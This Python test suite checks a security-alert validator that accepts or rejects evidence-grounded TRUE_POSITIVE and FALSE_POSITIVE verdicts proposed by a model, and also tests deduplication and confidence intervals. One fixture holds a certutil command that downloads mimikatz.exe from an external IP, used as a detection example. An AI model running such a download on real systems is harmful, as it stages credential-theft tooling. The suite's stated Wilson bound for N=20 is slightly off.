"""
AIS 2.5a Controlled Regression and Validator Decisive Coverage Test Suite.

Proves:
1. Valid True Positive acceptance: Genuinely corroborated malicious attack tradecraft
   (e.g. LOLBin with external C2 or definitive malware indicator) is accepted as TRUE_POSITIVE.
2. Valid False Positive acceptance: Genuinely authorized activity
   (e.g. approved management binary with verified path/signature, or approved domain baseline with clean reputation)
   is accepted as FALSE_POSITIVE.
3. Unsupported True Positive rejection: Dual-use administrative tools without corroborating
   attack indicators are rejected to REQUIRES_ATTENTION with TP_CRITERIA_UNSATISFIED / UNSUPPORTED_PREDICATE.
4. Unsupported False Positive rejection: Unverified binaries or uncorroborated assertions without
   independently verified authorization are rejected to REQUIRES_ATTENTION with FP_CRITERIA_UNSATISFIED.
5. Deduplication integrity: Distinct artifacts (different files/hosts) are recognized as distinct incidents.
6. Wilson interval calculation integrity: Exact 95% Wilson confidence intervals for small cohorts.
"""

import pytest
import math
from typing import Dict, Any, List

from app.schemas.canonical_evidence import CanonicalEvidenceRecord, EvidenceNormalizationResult
from app.schemas.evidence_contract import RuleEvidenceContract, EvidenceFieldRequirement
from app.services.evidence_preflight_validator import EvidencePreflightValidator
from app.services.model_claim_extractor import ModelClaimExtractor
from app.services.independent_verdict_validator import IndependentVerdictValidator
from app.services.empirical_benchmark_harness import EmpiricalBenchmarkHarness


def _make_rec(ev_id: str, field: str, value: Any, ev_type: str, inc_id: str = "INC-TEST") -> CanonicalEvidenceRecord:
    return CanonicalEvidenceRecord(
        evidence_id=ev_id,
        incident_id=inc_id,
        source_field=field,
        observed_value=value,
        evidence_type=ev_type,
        integrity_digest=f"digest-{ev_id}",
    )


def _make_norm(records: List[CanonicalEvidenceRecord], inc_id: str = "INC-TEST") -> EvidenceNormalizationResult:
    by_type: Dict[str, List[CanonicalEvidenceRecord]] = {}
    by_field: Dict[str, List[CanonicalEvidenceRecord]] = {}
    for r in records:
        by_type.setdefault(r.evidence_type, []).append(r)
        by_field.setdefault(r.source_field, []).append(r)
    return EvidenceNormalizationResult(
        incident_id=inc_id,
        total_evidence_count=len(records),
        available_evidence_count=len(records),
        records=records,
        evidence_by_type=by_type,
        evidence_by_field=by_field,
        field_validation_status={r.source_field: "PRESENT_VALID" for r in records},
    )


def _make_contract(rule_id: str, required_fields: List[str]) -> RuleEvidenceContract:
    reqs = [
        EvidenceFieldRequirement(field=f, evidence_type="OBSERVED_FACT", critical=True)
        for f in required_fields
    ]
    return RuleEvidenceContract(
        contract_id=f"CONTRACT-{rule_id}",
        rule_id=rule_id,
        rule_name="Test Contract",
        version_number=1,
        status="APPROVED",
        required_evidence=reqs,
    )


# =============================================================================
# 1. VALID TRUE POSITIVE ACCEPTANCE
# =============================================================================

def test_valid_corroborated_true_positive_accepted():
    """
    Demonstrates that the validator ACCEPTS a genuinely corroborated True Positive proposal:
    Adversary ingress tool transfer using certutil downloading executable payload from external IP.
    """
    inc_id = "INC-REG-TP-VALID"
    cmd = "certutil.exe -urlcache -split -f http://198.51.100.22/mimikatz.exe C:\\Temp\\mimikatz.exe"
    records = [
        _make_rec("EV-1", "process.command_line", cmd, "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-2", "process.file_name", "certutil.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-3", "process.executable_path", "C:\\Windows\\System32\\certutil.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-4", "network.destination_ip", "198.51.100.22", "NETWORK_CONNECTION", inc_id),
        _make_rec("EV-5", "file.path", "C:\\Temp\\mimikatz.exe", "FILE_MODIFICATION", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-TP-TEST", ["process.command_line", "network.destination_ip"])
    preflight = EvidencePreflightValidator.validate_preflight(inc_id, contract, norm_result, allow_simulation=True)

    model_output = {
        "verdict": "TRUE_POSITIVE",
        "confidence": 95.0,
        "reason": f"Malicious ingress tool transfer: {cmd} from untrusted public IP 198.51.100.22.",
        "supporting_claims": [
            {
                "claim_type": "PROCESS_EXECUTION",
                "field": "process.command_line",
                "asserted_value": cmd,
                "cited_evidence_ids": ["EV-1"],
            },
            {
                "claim_type": "NETWORK_CONNECTION",
                "field": "network.destination_ip",
                "asserted_value": "198.51.100.22",
                "cited_evidence_ids": ["EV-4"],
            },
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="TRUE_POSITIVE",
        raw_model_confidence=95.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    assert val_res.final_verdict == "TRUE_POSITIVE"
    assert val_res.is_decisive_accepted is True
    assert val_res.validation_status == "VALIDATED"
    assert "EVIDENCE_VALIDATED" in val_res.validation_reason_codes


# =============================================================================
# 2. VALID FALSE POSITIVE ACCEPTANCE (NETWORK & ENDPOINT)
# =============================================================================

def test_valid_endpoint_false_positive_accepted():
    """
    Demonstrates that the validator ACCEPTS a genuinely authorized endpoint administrative False Positive:
    Approved enterprise management agent running from verified directory with SYSTEM privileges.
    """
    inc_id = "INC-REG-FP-ENDPOINT"
    records = [
        _make_rec("EV-1", "process.name", "ccmexec.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-2", "process.executable_path", "C:\\Windows\\CCM\\CcmExec.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-3", "user.name", "NT AUTHORITY\\SYSTEM", "USER_CONTEXT", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-FP-ENDPOINT", ["process.name", "process.executable_path"])
    preflight = EvidencePreflightValidator.validate_preflight(inc_id, contract, norm_result, allow_simulation=True)

    model_output = {
        "verdict": "FALSE_POSITIVE",
        "confidence": 90.0,
        "reason": "Legitimate enterprise SCCM client execution from official C:\\Windows\\CCM directory.",
        "supporting_claims": [
            {
                "claim_type": "PROCESS_EXECUTION",
                "field": "process.name",
                "asserted_value": "ccmexec.exe",
                "cited_evidence_ids": ["EV-1"],
            },
            {
                "claim_type": "PROCESS_EXECUTION",
                "field": "process.executable_path",
                "asserted_value": "C:\\Windows\\CCM\\CcmExec.exe",
                "cited_evidence_ids": ["EV-2"],
            },
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="FALSE_POSITIVE",
        raw_model_confidence=90.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    assert val_res.final_verdict == "FALSE_POSITIVE"
    assert val_res.is_decisive_accepted is True
    assert val_res.validation_status == "VALIDATED"
    assert "EVIDENCE_VALIDATED" in val_res.validation_reason_codes


def test_valid_network_baseline_false_positive_accepted():
    """
    Demonstrates that the validator ACCEPTS a genuinely authorized network False Positive:
    Download from an approved enterprise domain baseline with clean reputation.
    """
    inc_id = "INC-REG-FP-NETWORK"
    records = [
        _make_rec("EV-1", "http.url", "https://cdn.enterprise-approved.com/widgets/feedback.js", "NETWORK_CONNECTION", inc_id),
        _make_rec("EV-2", "network.destination_domain", "cdn.enterprise-approved.com", "DNS_QUERY", inc_id),
        _make_rec("EV-3", "policy.approved_domain", "cdn.enterprise-approved.com", "AUTHORIZATION", inc_id),
        _make_rec("EV-4", "threat_intel.verdict", "clean", "THREAT_INTEL", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-FP-NETWORK", ["http.url", "network.destination_domain"])
    preflight = EvidencePreflightValidator.validate_preflight(inc_id, contract, norm_result, allow_simulation=True)

    model_output = {
        "verdict": "FALSE_POSITIVE",
        "confidence": 88.0,
        "reason": "Download from approved enterprise CDN domain cdn.enterprise-approved.com with clean reputation.",
        "supporting_claims": [
            {
                "claim_type": "NETWORK_CONNECTION",
                "field": "network.destination_domain",
                "asserted_value": "cdn.enterprise-approved.com",
                "cited_evidence_ids": ["EV-2"],
            },
            {
                "claim_type": "OBSERVED_FACT",
                "field": "policy.approved_domain",
                "asserted_value": "cdn.enterprise-approved.com",
                "cited_evidence_ids": ["EV-3"],
            },
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="FALSE_POSITIVE",
        raw_model_confidence=88.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    assert val_res.final_verdict == "FALSE_POSITIVE"
    assert val_res.is_decisive_accepted is True
    assert val_res.validation_status == "VALIDATED"
    assert "EVIDENCE_VALIDATED" in val_res.validation_reason_codes


# =============================================================================
# 3. UNSUPPORTED PROPOSAL REJECTION
# =============================================================================

def test_unsupported_true_positive_rejected_to_attention():
    """
    Demonstrates that uncorroborated dual-use admin commands are strictly REJECTED:
    whoami.exe execution without corroborating network/temp-path indicators is routed to REQUIRES_ATTENTION.
    """
    inc_id = "INC-REG-TP-UNSUPPORTED"
    cmd = "whoami.exe /priv"
    records = [
        _make_rec("EV-1", "process.command_line", cmd, "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-2", "process.file_name", "whoami.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-3", "network.destination_ip", "10.0.0.5", "NETWORK_CONNECTION", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-TP-TEST", ["process.command_line", "network.destination_ip"])
    preflight = EvidencePreflightValidator.validate_preflight(inc_id, contract, norm_result, allow_simulation=True)

    model_output = {
        "verdict": "TRUE_POSITIVE",
        "confidence": 80.0,
        "reason": "Host reconnaissance discovery command executed.",
        "supporting_claims": [
            {
                "claim_type": "PROCESS_EXECUTION",
                "field": "process.command_line",
                "asserted_value": cmd,
                "cited_evidence_ids": ["EV-1"],
            }
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="TRUE_POSITIVE",
        raw_model_confidence=80.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    assert val_res.final_verdict == "REQUIRES_ATTENTION"
    assert val_res.is_decisive_accepted is False
    assert "TP_CRITERIA_UNSATISFIED" in val_res.validation_reason_codes


def test_unsupported_false_positive_rejected_to_attention():
    """
    Demonstrates that False Positive proposals without verified authorization or clean baseline are REJECTED:
    Internal IP and unprivileged user alone CANNOT confirm False Positive.
    """
    inc_id = "INC-REG-FP-UNSUPPORTED"
    records = [
        _make_rec("EV-1", "network.source_ip", "10.1.2.3", "NETWORK_CONNECTION", inc_id),
        _make_rec("EV-2", "user.name", "jdoe", "USER_CONTEXT", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-FP-TEST", ["network.source_ip", "user.name"])
    preflight = EvidencePreflightValidator.validate_preflight(inc_id, contract, norm_result, allow_simulation=True)

    model_output = {
        "verdict": "FALSE_POSITIVE",
        "confidence": 85.0,
        "reason": "Internal IP and known user activity.",
        "supporting_claims": [
            {
                "claim_type": "NETWORK_CONNECTION",
                "field": "network.source_ip",
                "asserted_value": "10.1.2.3",
                "cited_evidence_ids": ["EV-1"],
            }
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="FALSE_POSITIVE",
        raw_model_confidence=85.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    assert val_res.final_verdict == "REQUIRES_ATTENTION"
    assert val_res.is_decisive_accepted is False
    assert "FP_CRITERIA_UNSATISFIED" in val_res.validation_reason_codes


# =============================================================================
# 5. DEDUPLICATION & CLUSTERING INTEGRITY
# =============================================================================

def test_deduplication_distinguishes_related_events_from_exact_duplicates():
    """
    Demonstrates that distinct artifacts (e.g. different script filenames or different endpoints)
    are recognized as DISTINCT records (is_duplicate=False) within a related security cluster,
    correcting the defect where different artifacts were falsely dropped as duplicates.
    """
    # Two distinct incidents with same rule and application, but different script filenames
    records = EmpiricalBenchmarkHarness.load_dataset_from_zip(strict_forensic_only=True)
    recs_by_id = {r.incident_id: r for r in records}

    # Incident 132499023 (clientlib-site.min.js) vs 132499745 (scripts-QBOKETIS.js)
    inc_023 = recs_by_id.get("132499023")
    inc_745 = recs_by_id.get("132499745")
    assert inc_023 is not None
    assert inc_745 is not None

    # Both must be distinct (neither should be marked as an exact duplicate of the other)
    assert inc_023.is_duplicate is False
    assert inc_745.is_duplicate is False

    # Incident 132599145 (jquery.knob.js), 132599146 (exporting.js), 132599330 (select2.min.js)
    # All are distinct JavaScript web assets
    inc_145 = recs_by_id.get("132599145")
    inc_146 = recs_by_id.get("132599146")
    inc_330 = recs_by_id.get("132599330")
    assert inc_145 is not None
    assert inc_146 is not None
    assert inc_330 is not None

    assert inc_145.is_duplicate is False
    assert inc_146.is_duplicate is False
    assert inc_330.is_duplicate is False
    assert len(records) == 20
    assert sum(1 for r in records if r.is_duplicate) == 0  # 0 exact duplicates in authentic cohort

def test_wilson_score_interval_exact_calculation():
    """
    Tests exact Wilson score 95% confidence interval computation:
    For N=2, k=0 successes, Wilson upper bound is ~0.6576 (65.76%), NOT 16.84%.
    For N=20, k=0 successes, Wilson upper bound is ~0.1684 (16.84%).
    Confirms root cause of AIS 2.5 discrepancy where N=20 formula was incorrectly applied to N=2 cohort.
    """
    ci_n2 = EmpiricalBenchmarkHarness.calculate_wilson_ci(0, 2, confidence=0.95)
    ci_n20 = EmpiricalBenchmarkHarness.calculate_wilson_ci(0, 20, confidence=0.95)

    assert ci_n2.lower_bound == 0.0
    assert math.isclose(ci_n2.upper_bound, 0.6576, abs_tol=0.01)

    assert ci_n20.lower_bound == 0.0
    assert math.isclose(ci_n20.upper_bound, 0.1684, abs_tol=0.01)
